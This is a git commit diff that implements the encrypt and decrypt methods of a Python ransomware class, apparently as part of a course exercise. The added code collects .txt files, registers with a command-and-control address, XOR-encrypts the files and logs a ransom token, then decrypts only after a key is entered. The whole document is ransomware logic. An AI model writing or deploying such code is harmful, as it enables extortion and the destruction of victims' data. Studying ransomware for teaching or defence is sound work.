8dbe63259349cde2c6f36c0c3ea92d96a01e8364
GuilhemCarriou <guilhem.carriou1@gmail.com>
2023-04-19 11:40:09 +0200

    Oubli_commit

--- ransomware.py
+++ ransomware.py
@@ -42,11 +42,43 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        files=self.get_files('*.txt')
+        secret_manager=SecretManager(remote_host_port=CNC_ADDRESS,token_path=TOKEN_PATH)
+        
+        try:
+            secret_manager.setup()
+            secret_manager.xorfiles(files)
+        except ConnectionError:
+            self._log.error('Connection error')
+            sys.exit(1)
+        except FileExistsError:
+            secret_manager.load()
+        
+        self._log.info(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        secret_manager=SecretManager(remote_host_port=CNC_ADDRESS,token_path=TOKEN_PATH)
+        try:
+            secret_manager.setup()
+        except ConnectionError:
+            self._log.error('No token found.')
+            sys.exit(1)
+        except FileExistsError:
+            secret_manager.load()
+        
+        while True:
+            b64_key=input('Enter Key:')
+            try:
+                secret_manager.set_key(b64_key)
+                files=self.get_files('*.txt')
+                secret_manager.xorfiles(files)
+                secret_manager.clean()
+                self._log.info('Files Decrypted.')
+                sys.exit(0)
+            except Exception as e: 
+                self._log.error('Invalid Key.')
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
